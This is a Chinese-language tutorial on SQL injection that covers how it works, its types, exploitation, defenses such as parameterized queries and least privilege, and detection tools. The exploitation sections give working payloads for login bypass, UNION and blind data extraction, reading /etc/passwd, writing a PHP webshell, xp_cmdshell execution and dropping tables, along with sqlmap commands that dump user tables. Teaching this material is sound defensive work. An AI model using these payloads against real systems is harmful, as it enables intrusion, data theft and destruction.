---
order: 52
title: SQL注入
module: cybersecurity
category: 'eng-infra'
difficulty: intermediate
description: SQL注入攻击原理、分类、利用技术与防御策略详解。
author: fanquanpp
updated: '2026-06-14'
related:
  - cybersecurity/CSRF攻击
  - cybersecurity/密码学应用
  - cybersecurity/Web安全深度
  - cybersecurity/命令注入
prerequisites:
  - cybersecurity/安全基础与防御
---

## 1. SQL 注入原理

### 1.1 什么是 SQL 注入

SQL 注入（SQL Injection）是将恶意 SQL 代码插入应用程序的查询中，从而执行非预期数据库操作的攻击方式。根本原因是将用户输入直接拼接进 SQL 语句。

### 1.2 漏洞代码示例

```python
# 危险：直接拼接用户输入
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

攻击者输入 `admin' --`，SQL 变为：

```sql
SELECT * FROM users WHERE username='admin' --' AND password=''
```

`--` 注释掉了密码验证，直接登录成功。

## 2. SQL 注入分类

### 2.1 按注入点分类

| 类型    | 特点           | 示例                           |
| ------- | -------------- | ------------------------------ |
| 字符型  | 注入点在引号内 | `WHERE name='[注入点]'`        |
| 数字型  | 注入点无引号   | `WHERE id=[注入点]`            |
| LIKE 型 | 模糊查询注入   | `WHERE name LIKE '%[注入点]%'` |

### 2.2 按返回方式分类

**联合查询注入（UNION）**：

```sql
-- 判断列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- 报错，说明 2 列

-- 联合查询
' UNION SELECT username, password FROM users--
```

**报错注入**：

```sql
-- extractvalue 报错注入
' AND extractvalue(1, concat(0x7e, (SELECT version())))--

-- updatexml 报错注入
' AND updatexml(1, concat(0x7e, (SELECT database())), 1)--
```

**布尔盲注**：

```sql
-- 逐字符猜解
' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND (SELECT SUBSTRING(database(),1,1))='s'--
```

**时间盲注**：

```sql
-- 基于响应时间判断
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--
```

### 2.3 按技术分类

| 类型        | 描述                             |
| ----------- | -------------------------------- |
| In-Band     | 使用同一通道注入和获取数据       |
| Inferential | 通过布尔/时间推断数据            |
| Out-of-Band | 通过 DNS/HTTP 等带外通道获取数据 |

## 3. SQL 注入利用技术

### 3.1 信息收集

```sql
-- 数据库版本
SELECT @@version          -- MySQL
SELECT version()          -- PostgreSQL
SELECT @@VERSION          -- SQL Server

-- 当前数据库
SELECT database()         -- MySQL
SELECT current_database() -- PostgreSQL

-- 所有数据库
SELECT schema_name FROM information_schema.schemata

-- 表名
SELECT table_name FROM information_schema.tables WHERE table_schema='目标库'

-- 列名
SELECT column_name FROM information_schema.columns WHERE table_name='目标表'
```

### 3.2 提权

```sql
-- MySQL 读取文件
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- MySQL 写入 WebShell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- SQL Server 执行命令
'; EXEC xp_cmdshell 'whoami'--
```

### 3.3 堆叠查询

```sql
'; INSERT INTO users(username, password) VALUES('hacker', '123456');--
'; DROP TABLE users;--
'; UPDATE users SET role='admin' WHERE username='hacker';--
```

## 4. SQL 注入防御

### 4.1 参数化查询（首选）

```python
# Python + psycopg2
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))

# Java + PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username=? AND password=?");
stmt.setString(1, username);
stmt.setString(2, password);

# Node.js + mysql2
connection.execute("SELECT * FROM users WHERE username=? AND password=?", [username, password]);
```

### 4.2 ORM 框架

```python
# Django ORM
User.objects.filter(username=username, password=password)

# SQLAlchemy
session.query(User).filter_by(username=username).first()

# Prisma
const user = await prisma.user.findUnique({ where: { username } })
```

> 注意：ORM 的原生查询方法仍可能存在注入风险。

### 4.3 输入验证

```python
# 白名单验证
if username not in ALLOWED_USERNAMES:
    raise ValueError("Invalid username")

# 正则验证
import re
if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
    raise ValueError("Invalid username format")
```

### 4.4 最小权限原则

```sql
-- 应用账户仅授予必要权限
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';

-- 禁止危险权限
REVOKE FILE, SUPER, PROCESS ON *.* FROM 'app_user'@'localhost';
```

### 4.5 WAF 规则

```
# ModSecurity 规则示例
SecRule ARGS "(?i)(union.*select|insert.*into|delete.*from|drop.*table|exec.*xp_)" \
  "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

## 5. SQL 注入检测

### 5.1 自动化工具

| 工具           | 特点                        |
| -------------- | --------------------------- |
| sqlmap         | 最强大的自动化 SQL 注入工具 |
| OWASP ZAP      | 综合 Web 扫描               |
| Burp Suite     | 手动+自动渗透测试           |
| jSQL Injection | Java 图形化注入工具         |

### 5.2 sqlmap 常用命令

```bash
# 检测注入点
sqlmap -u "http://example.com/page?id=1" --dbs

# 获取数据库表
sqlmap -u "http://example.com/page?id=1" -D dbname --tables

# 获取列名
sqlmap -u "http://example.com/page?id=1" -D dbname -T users --columns

# 导出数据
sqlmap -u "http://example.com/page?id=1" -D dbname -T users --dump

# POST 注入
sqlmap -u "http://example.com/login" --data="user=admin&pass=test" --method POST
```
